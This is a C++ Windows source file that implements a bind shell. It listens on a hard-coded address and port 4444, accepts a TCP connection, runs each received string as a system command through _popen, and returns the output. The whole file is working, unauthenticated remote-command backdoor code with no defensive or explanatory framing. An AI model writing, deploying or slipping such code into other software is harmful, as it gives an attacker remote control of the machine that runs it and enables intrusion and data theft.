#include <winsock2.h>
#include <iostream>
#include <cstdio>
#include <cstring>

#define LHOST "10.0.1.35"
#define LPORT 4444

#pragma comment(lib, "ws2_32.lib")  // Link with the Winsock library

// Function to execute command and get output
std::string execute_command(const std::string& command) {
    char buffer[128];
    std::string result = "";

    // Open a pipe to run the command and get the output
    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        return "Error: Failed to execute command.";
    }

    // Read the output from the command
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }

    _pclose(pipe);  // Close the pipe
    return result;
}

int main() {
    WSADATA wsaData;
    SOCKET server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    int client_addr_size = sizeof(client_addr);
    char buffer[1024];
    int bytes_received;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed!" << std::endl;
        return 1;
    }

    // Create socket
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed!" << std::endl;
        WSACleanup();
        return 1;
    }

    // Prepare server address structure
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(LHOST);
    server_addr.sin_port = htons(LPORT);

    // Bind socket
    if (bind(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        std::cerr << "Binding failed!" << std::endl;
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }

    // Listen for incoming connections
    if (listen(server_socket, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "Listen failed!" << std::endl;
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }

    std::cout << "Listening on " << LHOST << ":" << LPORT << "..." << std::endl;

    // Accept incoming connection
    client_socket = accept(server_socket, (struct sockaddr*)&client_addr, &client_addr_size);
    if (client_socket == INVALID_SOCKET) {
        std::cerr << "Accept failed!" << std::endl;
        closesocket(server_socket);
        WSACleanup();
        return 1;
    }

    std::cout << "Connection established with " << inet_ntoa(client_addr.sin_addr) << std::endl;

    // Send a prompt to the client (greeting message)
    const std::string prompt = "Welcome! Type your commands:\n";
    send(client_socket, prompt.c_str(), prompt.length(), 0);

    // Receive commands and execute them
    while ((bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytes_received] = '\0';  // Null-terminate the string

        // Strip any extraneous whitespace or newline characters
        std::string command(buffer);
        command.erase(command.find_last_not_of("\r\n") + 1);  // Remove trailing \r or \n

        // Print out the received command
        std::cout << "Received command: " << command << std::endl;

        // If the client sends "exit", break out of the loop
        if (command == "exit") {
            break;
        }

        // Execute the command and get the output
        std::string result = execute_command(command);

        // Send the output back to the client
        send(client_socket, result.c_str(), result.length(), 0);
    }

    if (bytes_received == SOCKET_ERROR) {
        std::cerr << "Recv failed!" << std::endl;
    }

    // Clean up and close sockets
    closesocket(client_socket);
    closesocket(server_socket);
    WSACleanup();

    return 0;
}
